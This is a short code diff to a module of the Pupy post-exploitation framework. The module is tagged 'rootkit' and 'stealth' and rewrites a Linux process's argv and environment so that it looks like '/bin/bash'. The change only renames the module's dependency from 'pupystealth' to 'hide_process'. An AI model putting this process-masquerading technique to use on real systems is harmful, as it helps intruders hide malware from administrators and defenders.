@@ -4,10 +4,12 @@ from pupylib.PupyModule import config, PupyModule, PupyArgumentParser
 
 __class_name__="HideProcessModule"
 
+
 @config(compat="linux", cat="manage", tags=["hide", "rootkit", "stealth"])
 class HideProcessModule(PupyModule):
     """ Edit current process argv & env not to look suspicious """
-    dependencies=["pupystealth"]
+
+    dependencies=["hide_process"]
 
     @classmethod
     def init_argparse(cls):
@@ -15,7 +17,6 @@ class HideProcessModule(PupyModule):
         cls.arg_parser.add_argument('--argv', default="/bin/bash", help='change the new process argv')
 
     def run(self, args):
-        change_argv = self.client.remote('pupystealth.change_argv', 'change_argv')
-
+        change_argv = self.client.remote('hide_process', 'change_argv')
         change_argv(argv=args.argv)
         self.success("process argv and env changed !")
